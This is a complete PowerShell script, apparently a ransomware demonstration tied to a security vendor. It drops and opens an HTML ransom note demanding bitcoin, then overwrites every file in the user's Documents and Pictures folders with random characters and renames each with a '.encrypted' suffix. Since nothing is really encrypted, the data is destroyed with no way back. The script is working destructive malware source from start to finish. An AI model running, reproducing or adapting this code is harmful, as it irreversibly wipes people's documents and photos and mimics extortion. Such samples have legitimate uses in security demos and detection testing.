Write-Output "This is an evil crypter!"

$notePage = @"
<!DOCTYPE html>
<html>
<head>
    <title>Ransom Note</title>
</head>
<style>
    body {
        background-color: #ff0000;
        color: #fff;
        font-family: monospace;
        font-size: 1.5em;
        text-align: center;
    }
</style>
<body>
	<p>
		You became a victim of ransomware. All your files have been encrypted.
	</p>
	<br/>
	<br/>
    <svg xmlns="http://www.w3.org/2000/svg" width="510" height="490" version="1">
        <path fill="#FFF" stroke="#000" stroke-width="12.5" d="M335.4 412.27l63.28 32.9c14.98 13.03 11.24 21.9 21.65 29.96 10.26 9.43 16.8 10.96 22.9 2.08 4.85-10.1 3.88-20.2 5.4-31.2 7.08-6.8 12.9-10.2 18.74-17 6.38-7.1 6.1-14.1-3.75-19.1-8.2-3.3-15.96-5-25.8-2.1-6.26 2-12.92 3.1-21.24-.4l-68.28-31.7-194-67.3c-26.1-12.7-47.78-22.2-73.6-36.5-14.02-11.1-9.5-23.8-26.48-34.1-7.47-3.7-12.87-5.4-18.85 4.8-3.82 9-3.52 18.6-4.1 27.9-6.68 7.2-14.24 11.4-19.73 20.3-7.95 12.8 4.1 17 10.6 18.6 18.44 4.6 25.1-3.7 42.1-.3 33.05 15.4 66.4 31.4 98.3 47.1z" stroke-linejoin="round"/>
        <path fill="#FFF" stroke="#000" stroke-width="12.5" d="M349.56 354.82l94.5-44.54c17.9-7.08 20.4 2.9 36.2 0 12.08-.14 22.07-4.86 21.24-16.23-6.1-9.03-11.8-14.7-22.48-24.57.56-10.54-1.4-20.67-5.4-30.8-4.17-5.97-11.67-8.6-22.9 2.08-11.38 8.6-7.78 20.12-22.07 32.05-23.3 11.6-44.54 21.8-70.35 34.6l-196.5 67.9c-22.75 12.1-43.42 23.3-69.5 33.3-21.24 5.3-20.4-7.7-46.2.9-7.37 5.8-7.23 14.2-1.26 20.4 6.93 6.8 11.8 11.1 17.9 17.1 1.94 8.6 2.22 16 3.33 26.3 4.16 12.6 13.33 11.9 21.23 5.8 3.47-4.3 7.77-8.2 10.4-12.9 3.6-6.2 7.64-13.3 12.5-19.1l62.85-33.3z" stroke-linejoin="round"/>
        <path fill="#FFF" stroke="#000" stroke-width="12.5" d="M128.5 221.56c-19.14-18.6-32.5-50.9-34.37-85.75-2-38.4 18.22-76.5 48.54-98.3C176.64 13.6 233.43 7 268.75 8.8c23.92.02 77.2 12.42 96.02 26.43 33 24 50.68 58.04 51.9 96.85 1.82 38.98-14.6 68.68-34.7 87.2"/>
        <path fill="#FFF" d="M130.4 215s-23.13 70.03 21.44 81.97l16.25 93.66c17.1 73.72 154.4 73.77 174.6 0l16.2-93.66c45.7-12.2 22.5-82 22.5-82z"/>
        <path fill="none" stroke="#000" stroke-width="12.5" d="M129.66 112.27c-7.75 6.78-6.77 16.97-5.38 32.2 1.1 11.55 8.48 22.93 8.87 33.5 2.7 22.27-3.88 44.56-6.98 62.78-2.13 20.92 3.88 38.95 11.63 45.92 7.75 6.88 17.76 9.73 28.27 12.94 9.55 2.5 14.5 6.9 21.73 12.3 8.6 9.2 10.66 16.7 10.46 26m183.8-226.1c7.75 6.8 6.77 17 5.38 32.2-1.1 11.6-8.48 23-8.87 33.5-2.7 22.3 3.88 44.6 6.98 62.8 2.13 21-3.88 39-11.63 46-7.75 6.9-21.94 10.6-28.27 12.9-7.37 2.6-14.92 7.3-21.72 12.7-8.2 7.9-10.66 16.3-10.47 25.6"/>
        <path fill="none" stroke="#000" stroke-width="12.5" d="M151.82 296.96c6.94 16.8 14.3 33.16 15 50.37-3.2 13.88-2.23 30.25 1.24 43.3 4.44 17.9 21.78 39.12 39.13 46.2 17.7 6.45 28.8 8.12 48.7 8.12"/>
        <path fill="none" stroke="#000" stroke-width="12.5" d="M358.92 296.96c-6.94 16.8-14.3 33.16-14.98 50.37 3.2 13.87 2.22 30.25-1.25 43.3-4.5 17.9-22 38.5-39.4 45.58-17.4 7.1-28.5 8.8-48.3 8.8"/>
        <path stroke="#000" stroke-width="1pt" d="M251.9 245.7c-9.7 7.38-11.86 9.86-17.22 18.02-1.94 3.15-5.56 10.5-6.55 15.44-1 4.94-1.73 12.1-1.72 15.9.1 12.85 4.1 20.9 8.6 20.63 4-.5 9.1-4.7 16.8-14.1m7.1-55.7c9.7 7.3 11.9 9.8 17.2 18 2 3.1 5.6 10.5 6.6 15.4s1.8 12.1 1.7 15.9c0 12.8-4.1 20.9-8.5 20.6-4-.5-9.1-4.7-16.8-14.1m-89.5-112.3c13.5-2.4 26.5-3.9 40-5.4 17.6-4.5 26.5 15.6 21.7 30.8-6.1 13.4-14.7 25.2-24.5 36.6-7.6 8.6-16.7 9.9-25.4 7-7-2-13.4-6.3-20.4-16.3-3-8.6-5.6-13.1-9.5-23.7-3.02-9.9 1.7-24.6 18.3-29.2zm172.1 0c-13.4-2.4-26.5-3.9-39.9-5.4-17.6-4.5-26.5 15.6-21.6 30.8 6.1 13.4 14.7 25.2 24.6 36.6 7.7 8.6 16.8 9.9 25.4 7 7-2 13.5-6.3 20.4-16.3 3.1-8.6 5.7-13.1 9.6-23.7 3.1-9.9-1.7-24.6-18.3-29.2z"/>
        <path fill="none" stroke="#000" stroke-width="6.25" d="M169.23 304.53c5.7 13.34 7.45 18.4 11.55 31.72 3.5 12.3 4.8 19.8 6.95 37.26m153.37-69.7c-5.7 13.4-7.46 18.4-11.57 31.7-3.5 12.3-4.78 19.8-6.94 37.3"/>
        <path fill="none" stroke="#000" stroke-width="5" d="M193.52 335.73c14.7 9.03 40.16 10.42 62.95 10 25.4-.12 47.13-1.95 61.4-10.6m-119.2 24.15c16.23 10.2 35.33 13.7 57.32 12.88 22.8-.56 40.3-2.48 56-13.17"/>
        <path fill="none" stroke="#000" stroke-width="6.25" d="M186.9 371.64c17.36 20.95 41.6 24.6 69.17 25.32 29.5 1.08 59.16-10.65 66.8-25.3"/>
        <path stroke="#000" stroke-width="5" d="M198.44 340.26l-.4 41.2m13.93-36.83l-.2 44.12m15.2-42.25l-.43 46.2m13.96-45.16l-.22 46.83m15.4-46.4v46.82m14.57-47.1l.2 46.8m12.92-48.1l.4 46m14.8-48.5l.2 44.1m13.53-49.6l.4 41.6"/>
    </svg>
	<br/>
	<div id="mail">
	    To get your files back, pay us 1 bitcoin to the following address:<br/>
	    <a href="mailto:demo-attacker@gdata.de" target="_blank">demo-attacker@gdata.de</a>
	</div>
</body>
</html>
"@

# Drop and show ransom note

$desktopPath = [Environment]::GetFolderPath("Desktop")
$notePath = "$desktopPath\README_ransomnote.html"
if (Test-Path $notePath) {
    Remove-Item -Path $notePath
}
New-Item $notePath -type file
Set-Content -Path $notePath -Value $notePage
Invoke-Item $notePath

# Encrypt files

$documentsPath = [Environment]::GetFolderPath("MyDocuments")
$picturesPath = [Environment]::GetFolderPath("MyPictures")
$documents = Get-ChildItem $documentsPath -File *
$pictures = Get-ChildItem $picturesPath -File *
$files = $documents + $pictures

$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".ToCharArray()
    
foreach ($file in $files) {
    $filepath = $file.FullName
    $filename = $file.Name
    $length = Get-Random -max 10000
    $content = -join ((1..$length) | ForEach-Object { $characters | Get-Random })
    Set-Content -Path $filepath -Value $content
    Rename-Item -Path $filepath -NewName "$filename.encrypted"
}
